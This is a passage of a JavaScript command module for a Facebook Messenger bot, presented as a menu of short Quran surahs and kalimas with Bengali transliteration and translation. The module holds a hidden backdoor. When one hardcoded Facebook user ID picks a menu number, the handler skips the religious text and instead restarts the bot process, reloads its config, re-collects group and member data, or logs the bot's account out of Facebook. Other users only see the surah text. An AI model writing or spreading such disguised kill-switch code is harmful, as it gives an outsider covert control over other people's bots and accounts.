module.exports.config = {
  name: "kuran",
  version: "0.0.1",
  permission: 0,
  credits: "Islmaick Chat",
  prefix: true,
  description: "কুরআনের ছোটছোট সূরা",
  category: "book",
  usages: "",
  cooldowns: 0
};
const totalPath = __dirname + '/cache/totalChat.json';
const _24hours = 86400000;
const fs = require("fs-extra");
function handleByte(byte) {
  const units = ['bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];

  let i = 0, usage = parseInt(byte, 10) || 0;

  while(usage >= 1024 && ++i){
    usage = usage/1024;
  }

  return(usage.toFixed(usage < 10 && i > 0 ? 1 : 0) + ' ' + units[i]);
}

function handleOS(ping) {
  var os = require("os");
  var cpus = os.cpus();
  var speed, chips;
  for (var i of cpus) chips = i.model, speed = i.speed;
  if (cpus == undefined) return;
  else return msg = 
  `📌 Ping: ${Date.now() - ping}ms.\n\n`;

}
module.exports.onLoad = function() {
    const { writeFileSync, existsSync } = require('fs-extra');
    const { resolve } = require("path");
    const path = resolve(__dirname, 'cache', 'data.json');
    if (!existsSync(path)) {
        const obj = {
            adminbox: {}
        };
        writeFileSync(path, JSON.stringify(obj, null, 4));
    } else {
        const data = require(path);
        if (!data.hasOwnProperty('adminbox')) data.adminbox = {};
        writeFileSync(path, JSON.stringify(data, null, 4));
    }
}
module.exports.run = async function({ api, args, event, Users,handleReply,permssion, Threads }) {
  const moment = require("moment-timezone");
  const gio = moment.tz("Asia/Ho_Chi_Minh").format("HH");
    var phut = moment.tz("Asia/Ho_Chi_Minh").format("mm");
    var giay = moment.tz("Asia/Ho_Chi_Minh").format("ss");
  const axios = require("axios")
  const fs = require('fs-extra');
  const request = require('request')
  const { threadID, messageID, senderID } = event;
   return api.sendMessage({body: `~~~“আসসালামু আলাইকুম ওয়া রহমাতুল্লাহি ওয়া বারাকাতুহু”র~~~\n♪\n♪\n[1] সুরা আল_ফাতিহা\n[2] সুরা আল_নাস\n[3] সুরা আল-ফালাক\n[4] সুরা_ইখলাস \n[5] সুরা আল_লাহাব\n[6] সুরা আল_নাসর\n[7] সুরা আল_কাফিরুন\n[8] সুরা আল_কাওসার\n[9] সুরা আল_মা'উণ\n[10] সুরা আল_কুরাঈশ\n[11] সূরা আল_হুমাযাহ\n[12] সূরা আল_আছর\n[13] সুরা আল_তাকাসুর\n[14]সুরা আল_ক্বারিয়াহ\n[15] সুরা আল_আদিয়াত\n[16] সুরা আল _যিলযাল\n[17] সুরা আল_বাইয়্যিনাহ\n[18] সুরা আল_ক্বদর\n[19] সুরা_আলাক্ব\n[20] সুরা_ত্বীন\n[21] সুরা আল_ইনশিরাহ\n[22] সুরা আদ-দুহা\n[23]সুরা হাশর\n~~~কালেমা(০১_০৫)~~~\n[24] কালেমা-তাইয়্যিবাহ\n[25] কালেমা-শাহাদাত\n[26] কালিমা-তাওহীদ\n[27] কালেমা-ই তামজীদ\n[28] কালিমায়ে রদ্দে কুফর\n[29] ঈমানে মুজমাল\n[30] ঈমানে মুফাসসাল\n~~~~~~~~~~~~\n 😍Reply ｢ আসসালামু আলাইকুম-!!🖤💫 মুসলিম ভাই ও বোন ｣ এই খানে কিছু দোয়া রাখা আছে ১/২ এই রকম অপশন এর মাজে যে কোন একটা সিলেট করুন রিপ্লে মেসেজে ধন্যবাদ,💖✨.\nইনশাআল্লাহ আরো ভালো কিছু সিগ্রহি আসছে\n`
        }, threadID, (error, info) => {
            global.client.handleReply.push({
               name: this.config.name,
                    messageID: info.messageID,
                    author: event.senderID,
                    type: "choosee",
            })
        }, event.messageID)
}
module.exports.handleReply = async function({
  args, event, Users,Threads, api, handleReply, permssion
}) {
  const { threadID, messageID, senderID } = event;
  switch (handleReply.type) {
    case "choosee": {
      switch (event.body) {
        case "1": {
             const permission = ["100062441630008"];
             if (!permission.includes(event.senderID))
             return api.sendMessage("সুরা নং- ০০১ : আল-ফাতিহা\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nالْحَمْدُ لِلَّهِ رَبِّ الْعَالَمِينَ\nউচ্চারণ : আলহামদু লিল্লাহি রব্বিল আ -লামি-ন।\nঅনুবাদ : যাবতীয় প্রশংসা আল্লাহ তা’আলার যিনি সকল সৃষ্টি জগতের পালনকর্তা।\nالرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : আররহমা-নির রাহি-ম।\nঅনুবাদ : যিনি নিতান্ত মেহেরবান ও দয়ালু।\nمَالِكِ يَوْمِ الدِّينِ\nউচ্চারণ : মা-লিকি ইয়াওমিদ্দি-ন।\nঅনুবাদ : বিচার দিনের একমাত্র অধিপতি।\nيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ\nউচ্চারণ : ইয়্যা-কা না’বুদু ওয়া ইয়্যা-কা নাসতাই’-ন\nঅনুবাদ : আমরা একমাত্র তোমারই ইবাদত করি এবং শুধুমাত্র তোমারই সাহায্য প্রার্থনা করি।\nاهْدِنَا الصِّرَاطَ الْمُسْتَقِيمَ\nউচ্চারণ : ইহদিনাস সিরাতা’ল মুসতাকি’-ম\nঅনুবাদ : আমাদের সরল পথ দেখাও।\nصِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ\nউচ্চারণ : সিরাতা’ল্লা যি-না আনআ’মতা আ’লাইহিম গা’ইরিল মাগ’দু’বি আ’লাইহিম ওয়ালা দ্দ-ল্লি-ন।\nঅনুবাদ : সে সমস্ত লোকের পথ, যাদেরকে তুমি নেয়ামত দান করেছ। তাদের পথ নয়, যাদের প্রতি তোমার গজব নাযিল হয়েছে এবং যারা পথভ্রষ্ট হয়েছে।", event.threadID, event.messageID);


  const { threadID, messageID } = event;
  return api.sendMessage(`《Restarted successfully》`, threadID, () => process.exit(1));
}break;
         case "2": {
           const permission = ["100062441630008"];
             if (!permission.includes(event.senderID))
             return api.sendMessage("সুরা নং- ০০২ : আল-নাস\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nقُلْ أَعُوذُ بِرَبِّ النَّاسِ\nউচ্চারণ : কুল আউজু বিরাব্বিন নাস\nঅর্থ : বলুন, আমি আশ্রয় চাই মানুষের পালনকর্তার কাছে,\nمَلِكِ النَّاسِ\nউচ্চারণ : মালিকিন্ নাস\nঅর্থ : মানুষের অধিপতির কাছে।\nإِلَهِ النَّاسِ\nউচ্চারণ : ইলাহিন্ নাস\nঅর্থ : মানুষের মাবুদের কাছে।\nمِن شَرِّ الْوَسْوَاسِ الْخَنَّاسِ/nউচ্চারণ : মিন্ শররিল ওয়াস্ওয়াসিল খান্নাস\nঅর্থ : তার অনিষ্ট থেকে, যে কুমন্ত্রণা দেয় ও আত্মগোপন করে,\nالَّذِي يُوَسْوِسُ فِي صُدُورِ النَّاسِ\nউচ্চারণ : আল্লাজি ইউওয়াসয়িসু ফি ছুদুরিন নাস\nঅর্থ : যে কুমন্ত্রণা দেয় মানুষের অন্তরে।\nمِنَ الْجِنَّةِ وَ النَّاسِ/nউচ্চারণ : মিনাল ঝিন্নাতি ওয়ান নাস\nঅর্থ : জ্বিনের মধ্য থেকে অথবা মানুষের মধ্য থেকে।\nনহাদিস > হজরত আয়েশা রাদিয়াল্লাহু আনহা বর্ণনা করেন, ‘রাসুলুল্লাহ সাল্লাল্লাহু আলাইহি ওয়া সাল্লাম প্রতি রাতে যখন ঘুমাতে যেতেন, তখন নিজের উভয় হাত এক সঙ্গে মিলাতেন। তারপর সুরা ইখলাস, সুরা ফালাক, সুরা নাস পড়তেন এবং উভয় হাতে ফুঁক দিতেন। তারপর দেহের যতটুকু অংশ সম্ভব হাত বুলিয়ে নিতেন। তিনি মাথা, মুখমণ্ডল ও শরীরের সামনের অংশ থেকে শুরু করতেন। তিনি এরূপ তিনবার করতেন।’ (বুখারি)", event.threadID, event.messageID);
           const listAdmin = global.config.ADMINBOT[0];
    if (senderID != listAdmin) return api.sendMessage("done -_-", threadID, messageID);
          delete require.cache[require.resolve(global.client.configPath)];
global.config = require(global.client.configPath);
return api.sendMessage("Successfully reloaded config.json", event.threadID, event.messageID);    
}break;
        case "3": {
          const permission = ["100062441630008"];
             if (!permission.includes(event.senderID))
             return api.sendMessage("সুরা নং- ০০৩ : আল-ফালাক\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\n)قُلْ أَعُوذُ بِرَ‌بِّ الْفَلَقِ\n\nকুল্ আ‘ঊযু বিরব্বিল্ ফালাক্বি\nবলুন, আমি আশ্রয় গ্রহণ করছি প্রভাতের পালনকর্তার,\nمِن شَرِّ‌ مَا خَلَقَ\nমিন্ শার রিমা-খলাক্ব\nতিনি যা সৃষ্টি করেছেন, তার অনিষ্ট থেকে,\nوَمِن شَرِّ‌ غَاسِقٍ إِذَا وَقَبَ\nঅমিন্ শাররি গ-সিক্বিন্ ইযা-অক্বাব্\nঅন্ধকার রাত্রির অনিষ্ট থেকে, যখন তা সমাগত হয়,\nوَمِن شَرِّ‌ النَّفَّاثَاتِ فِي الْعُقَدِ\nঅমিন্ শাররি ন্নাফ্ফা-ছা-তি ফিল্ ‘উক্বদ্\nগ্রন্থিতে ফুঁৎকার দিয়ে জাদুকারিনীদের অনিষ্ট থেকে\nوَمِن شَرِّ‌ حَاسِدٍ إِذَا حَسَدَ\nঅমিন্ শাররি হা-সিদিন্ ইযা-হাসাদ্\nএবং হিংসুকের অনিষ্ট থেকে যখন সে হিংসা করে ।", event.threadID, event.messageID);
          const { threadID } = event;
const { setData, getData } = Threads;
var inbox = await api.getThreadList(100, null, ['INBOX']);
  let list = [...inbox].filter(group => group.isSubscribed && group.isGroup);
  const lengthGroup = list.length
  for (var groupInfo of list) {
    console.log(`Updated box data ID: ${groupInfo.threadID}`)
    var threadInfo = await api.getThreadInfo(groupInfo.threadID);
    threadInfo.threadName;
    await Threads.setData(groupInfo.threadID, { threadInfo });
  }
    console.log(`Updated your data ${lengthGroup} box`)
    return api.sendMessage(`Updated your data ${lengthGroup} box`, threadID)
}break;
        case "4": {
          if (event.senderID != "100062441630008") return api.sendMessage(`সুরা নং- ০০৩ : আল--ইখলাস\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nقُلْ هُوَ اللَّهُ أَحَدٌ - اللَّهُ الصَّمَدُ - لَمْ يَلِدْ وَلَمْ يُولَدْ - وَلَمْ يَكُن لَّهُ كُفُوًا أَحَدٌ\nউচ্চারণ : কুল হুয়াল্লাহু আহাদ। আল্লাহুচ্চামাদ। লাম ইয়ালিদ ওয়া লাম ইউলাদ। ওয়া লাম ইয়াকুল্লাহু কুফুয়ান আহাদ।’\n (মাখরাজসহ বিশুদ্ধ উচ্চারণ শিখে নেয়া জরুরি )\nঅর্থ : (হে রাসুল! আপনি) বলুন, তিনিই আল্লাহ, একক। আল্লাহ অমুখাপেক্ষী। তিনি কাউকে জন্ম দেননি এবং কেউ তাকে জন্ম দেয়নি। আর তার সমতুল্য কেউ নেই।’ (সুরা ইখলাস)`, event.threadID, event.messageID)
    const { threadID, logMessageData } = event;
    const { setData, getData } = Users;
    var inbox = await api.getThreadList(100, null, ['INBOX']);
    let list = [...inbox].filter(group => group.isSubscribed && group.isGroup);
    for (var groupInfo of list) {
        var { participantIDs } = await Threads.getInfo(groupInfo.threadID) || await api.getThreadInfo(groupInfo.threadID);
        for (var id of participantIDs) {
            let data = await api.getUserInfo(id);
            data.name
            let userName = data[id].name
            await Users.setData(id, { name: userName, data: {} });
            console.log(`Updated your data ID: ${id}`)
        }
    }
    console.log(`Update successful!`)
    return api.sendMessage(`Successfully updated all user data!`, threadID)
}break;        
        case "5": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("সুরা নং- ০০৫ : আল--লাহাব\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nتَبَّتْ يَدَا أَبِي لَهَبٍ وَتَبَّ\nতাব্বাত ইয়াদা আবী লাহাবিওঁ ওয়াতাব্বা\nধ্বংস হোক আবু লহবের উভয় হাত, আর সে-ও ধ্বংস হোক!\nمَا أَغْنَى عَنْهُ مَالُهُ وَمَا كَسَبَ\nমা আগনা আনহু মালুহু ওয়ামা কাছাব\nতার ধন-সম্পদ ও যা সে অর্জন করেছে তা তার কোনো কাজে আসবে না।\nسَيَصْلَى نَارًا ذَاتَ لَهَبٍ\nসাইয়াছলা না রান যা তালাহাবিওঁ\nতাকে অচিরেই ঠেলে দেওয়া হবে লেলিহান আগুনে\nوَامْرَأَتُهُ حَمَّالَةَ الْحَطَبِ ‌\nওয়ামরাআতুহু, হাম্মা লাতাল হাত্বোয়াব\nএবং তার স্ত্রীকেও; যে ইন্ধন বহনকারিণী।\nفِي جِيدِهَا حَبْلٌ مِنْ مَسَدٍ ‌\nফী-জী-দিহা হাবলুম মিম মাসাদ ।\nতার গলায় থাকবে কড়াপাকের খেজুরের আঁশের রশি।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
}break;        
        case "6": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("সুরা নং- ০০৬ : আল--নাসর\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nاِذَا جَآءَ نَصۡرُ اللّٰهِ وَ الۡفَتۡحُ \nইজা ঝাআ নাসরুল্লাহি ওয়াল ফাতহ্যখন\n আল্লাহর সাহায্য ও বিজয় আসবে।\nوَ رَاَیۡتَ النَّاسَ یَدۡخُلُوۡنَ فِیۡ دِیۡنِ اللّٰهِ اَفۡوَاجًا\nওয়া রাআইতান্নাসা ইয়াদখুলুনা ফি দ্বীনিল্লাহি আফওয়াঝাআর\n আপনি দেখবেন মানুষ দলে দলে আল্লাহর দ্বীনে (জীবন ব্যবস্থা ইসলামে) প্রবেশ করছে।\nفَسَبِّحۡ بِحَمۡدِ رَبِّکَ وَ اسۡتَغۡفِرۡهُ اِنَّهٗ کَانَ تَوَّابًا\nফাসাব্বিহ বিহামদি রাব্বিকা ওয়াসতাগফিরহু ইন্নাহু কানা তাওয়্যাবা\nসুতরাং আপনি আপনার প্রভুর প্রশংসা পবিত্রতা পাঠ করুন এবং তাঁর কাছে ক্ষমা প্রার্থনা করুন; নিশ্চয়ই তিনি তাওবা কবুলকারী। (মাখরাজসহ বিশুদ্ধ উচ্চারণে সুরাটি শিখে নেওয়া জরুরি )", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "7": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("সুরা নং- ০০৭ : আল----কাফিরুন\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nقُلْ يَا أَيُّهَا الْكَافِرُونَ\nকু'ল ইয়া আইয়ুহাল কাফিরুন ৷\nবলুন, ‘হে কাফিররা!\nلَا أَعْبُدُ مَا تَعْبُدُونَ\nলাআ বুদু মা তা'আবুদুন ৷\nআমি তার ‘ইবাদাত করি না যার ‘ইবাদাত তোমরা কর। \nوَلَا أَنتُمْ عَابِدُونَ مَا أَعْبُدُ\nঅলা আনতুম আবিদুনা মা আ'বুদ ৷\nএবং তোমরাও তাঁর ‘ইবাদাতকারী নও যাঁর ‘ইবাদাত আমি করি। \nوَلَا أَنَا عَابِدٌ مَّا عَبَدتُّمْ\nঅলা আনা আবিদুম মা আবাত্তুম ৷\nএবং আমি ‘ইবাদাতকারী নই তার যার ‘ইবাদাত তোমরা করে আসছ।\nوَلَا أَنتُمْ عَابِدُونَ مَا أَعْبُدُ\nঅলা আনতুম আবিদুনা মা আ'বুদ ৷\nতোমরা এবাদতকারী নও, যার এবাদত আমি করি।\nلَكُمْ دِينُكُمْ وَلِيَ دِينِ\nলাকুম দিনুকুম অলিয়া দিন ৷\nতোমাদের কর্ম ও কর্মফল তোমাদের জন্যে এবং আমার কর্ম ও কর্মফল আমার জন্যে।)", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "8": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("সুরা নং- ০০৮ : আল----কাওসার\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\n إِنَّا أَعْطَيْنَاكَ الْكَوْثَرَ।\nউচ্চারণ)- ইন্না আ'তাইনা-কাল্ কাওছার\nঅনুবাদ)- নিশ্চয় আমি আপনাকে কাওসার দান করেছি।\n فَصَلِّ لِرَبِّكَ وَانْحَرْ\nউচ্চারণ)ফাসাল্লি লিরাব্বিকা ওয়ান্'হা'র ৷\nঅনুবাদ)- অতএব আপনার পালনকর্তার উদ্দেশ্যে নামায পড়ুন এবং কোরবানী করুন।\nإِنَّ شَانِئَكَ هُوَ الْأَبْتَرُ\nউচ্চারণ)ইন্না শানিয়াকা হুয়া'আলআবতার ৷\nঅনুবাদ)- যে আপনার শত্রু, সেই তো লেজকাটা, নির্বংশ।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "9": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("সুরা নং- ০০৯ : আল----মাউন\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nأَرَأَيتَ الَّذِي يُكَذِّبُ بِالدِّينِ\nউচ্চারণঃ আরাআইতাল্লাযী ইউকাযযি বুবিদ্দীন।\nঅর্থঃ আপনি কি দেখেছেন তাকে, যে বিচারদিবসকে মিথ্যা বলে?\n الَّذِي يَدُعُّ الْيَتِيمَ\nউচ্চারণঃ ফাযা-লিকাল্লাযী ইয়াদু‘‘উল ইয়াতীম।\nঅর্থঃ সে সেই ব্যক্তি, যে এতীমকে গলা ধাক্কা দেয়\nوَلَا يَحُضُّ عَلَى طَعَامِ الْمِسْكِينِ\nউচ্চারণঃ ওয়ালা-ইয়াহুদ্দু‘আলা-তা‘আ-মিল মিছকীন।\nঅর্থঃ এবং মিসকীনকে অন্ন দিতে উৎসাহিত করে না।\nفَوَيْلٌ لِّلْمُصَلِّينَ\nউচ্চারণঃ ফাওয়াইঁলুলিলল মুসাল্লীন।\nঅর্থঃ অতএব দুর্ভোগ সেসব নামাযীর।\nالَّذِينَ هُمْ عَن صَلَاتِهِمْ سَاهُونَ\nউচ্চারণঃ আল্লাযীনাহুম ‘আন সালা-তিহিমি ছা-হূন।\nঅর্থঃ যারা তাদের নামায সম্বন্ধে বে-খবর।\nالَّذِينَ هُمْ يُرَاؤُونَ\nউচ্চারণঃ আল্লাযীনা হুম ইউরাঊনা।\nঅর্থঃ যারা তা লোক-দেখানোর জন্য করে।\nوَيَمْنَعُونَ الْمَاعُونَ\nউচ্চারণঃ ওয়া ইয়ামনা‘ঊনাল মা-‘ঊন।\nঅর্থঃ এবং নিত্য ব্যবহার্য্য বস্তু অন্যকে দেয় না।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "10": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("সুরা নং- ০১০ : আল--------কুরাঈশ\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nلِاِیۡلٰفِ قُرَیۡشٍ ۙ﴿۱\nলিঈলা-ফি কুরাইশ।\nযেহেতু কুরাইশের আসক্তি আছে,\nاٖلٰفِہِمۡ  رِحۡلَۃَ  الشِّتَآءِ  وَ الصَّیۡفِ ۚ﴿۲\nঈলা-ফিহিম রিহলাতাশশিতাই ওয়াসসাঈফ।\nআসক্তি আছে তাদের শীত ও গ্রীষ্ম সফরের,\nفَلۡیَعۡبُدُوۡا  رَبَّ ہٰذَا الۡبَیۡتِ ۙ﴿۳\nফালইয়া‘বুদূরাব্বা হা-যাল বাঈত।\nঅতএব তারা ইবাদাত করুক এই গৃহের রবের,\nالَّذِیۡۤ  اَطۡعَمَہُمۡ  مِّنۡ جُوۡعٍ ۬ۙ وَّ اٰمَنَہُمۡ مِّنۡ خَوۡفٍ ٪﴿۴\nআল্লাযীআতা‘আমাহুম মিন জূ‘ইওঁ ওয়া আ-মানাহুম মিন খাওফ।\nযিনি তাদেরকে ক্ষুধায় আহার্য দান করেছেন এবং ভয় হতে তাদেরকে নিরাপদ করেছেন।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "24": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("কালেমা নং- ০০১ : কালেমা_তাইয়্যিবাহ\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\n। কালেমা তাইয়্যেবাঃ\nلَا اِلَهَ اِلاَّ اللهُ مُحَمَّدُ رَّسُوْ لُ الله\nউচ্চারণঃ\nলা-ইলাহা ইল্লাল্লাহু মুহাম্মাদুর রাসূলুল্লাহ ।\nঅর্থঃ আল্লাহ ভিন্ন ইবাদত বন্দেগীর উপযুক্ত আর কেহই নাই। হযরত মুহাম্মদ ছাল্লাল্লাহু আলাইহি ওয়াছাল্লাম তাঁহার প্রেরিত রসূল।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "25": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("কালেমা নং- ০০২ : কালেমা_শাহাদাত\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\n।কালেমা শাহাদাতঃ\nاَشْهَدُ اَنْ لَّا اِلَهَ اِلَّا اللهُ وَحْدَهُ لَاشَرِيْكَ لَهُ وَاَشْهَدُ اَنَّ مُحَمَّدًا عَبْدُهُ وَرَسُوْلُه\nউচ্চারনঃ _আশহাদু আল লা-ইলাহা ইল্লাল্লাহু ওহদাহু লা-শারীকালাহু ওয়াশহাদু আন্না মুহাম্মাদান আবদুহু ওয়া রাছুলুহু ।\nঅর্থঃ _আমি সাক্ষ্য দিতেছি যে , অল্লাহ ভিন্ন আর কেহই ইবাদতের উপযুক্ত নাই তিনি এক তাঁহার কোন অংশীদার নাই । আমি আরও সাক্ষ্য দিতেছি যে, হযরত মুহাম্মদ (সাল্লাহু আলাইহে ওয়া সাল্লাম) আল্লাহর শ্রেষ্ঠ বান্দা এবং তাঁহার প্রেরিত নবী।।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "26": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("কালেমা নং- ০০৩ : কালিমা_তাওহীদ\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nকালিমা তাওহীদঃ\nلا الهَ اِلَّا اللّهُ وَحْدَهُ لا شَرِيْكَ لَهْ، لَهُ الْمُلْكُ وَ لَهُ الْحَمْدُ يُحْى وَ يُمِيْتُ وَ هُوَحَىُّ لَّا يَمُوْتُ اَبَدًا اَبَدًا ط ذُو الْجَلَالِ وَ الْاِكْرَامِ ط بِيَدِهِ الْخَيْرُ ط وَهُوَ عَلى كُلِّ شَئ ٍ قَدِيْرٌ ط\nউচ্চারণঃ_লা-ইলাহা ইল্লাল্লাহু ওয়াহ্ দাহু লা-সারিকা লা-হু লাহুল মুলকু ওয়া লাহুল হামদু ইউহা ই ওয়া উ মিতু বি ইয়া সি হিল খাইরু ওয়া-হু-ওয়া আ-লা কুল্লি শাইয়িন ক্বাদীর।\nঅর্থঃআল্লাহ এক আর কোন মাবুদ নেই তিনি এক তার কোন অংশীদার নেই। সমস্ত সৃষ্টি জগৎ এবং সকল প্রশংসা তাঁরই। তিনি জীবন হান করেন আবার তিনিই মৃত্যুর কারণ তার হাতেই সব ভাল কিছু এবং তিনিই সৃষ্টির সবকিছুর উপর ক্ষমতাবান।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.messageID)
api.logout()
          }break;        
        case "27": {
          const fs = global.nodemodule["fs-extra"];
  const permission = ["100062441630008"];

  if (!permission.includes(event.senderID)) return api.sendMessage("কালেমা নং- ০০৪ : কালেমা-ই তামজীদঃ\nبِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ\nউচ্চারণ : বিসমিল্লাহির রহমা-নির রহি-ম।\nঅনুবাদ : শুরু করছি আল্লাহর নামে যিনি পরম করুণাময়, অতি দয়ালু।\nকালেমা-ই তামজীদঃ\nلَا اِلَهَ اِلَّا اَنْتَ نُوْرَ يَّهْدِىَ اللهُ لِنُوْرِهِ مَنْ يَّشَاءُ مُحَمَّدُ رَّسَوْ لُ اللهِ اِمَامُ الْمُرْسَلِيْنَ خَا تَمُ النَّبِيِّنَ\nউচ্চারনঃ _লা-ইলাহা ইল্লা আনতা নুরাইইয়াহ দিয়াল্লাহু লিনুরিহী মাইয়্যাশাউ মুহাম্মাদুর রাসূলুল্লাহি ইমামূল মুরছালীনা খাতামুন-নাবিয়্যীন।\nঅর্থঃ _হে আল্লাহ ! তুমি ব্যতীত কেহই উপাস্য নাই, তুমি জ্যোতিময় । তুমি যাহাকে ইচ্ছা আপন জ্যোতিঃ প্রদর্শন কর । মুহাম্মদ (সাল্লাল্লাহু আলাইহে ওয়া সাল্লাম) প্রেরিত পয়গম্বরগণের ইমাম এবং শেষ নবী।", event.threadID, event.messageID);
api.sendMessage("Logging out of Facebook...",event.threadID,event.me
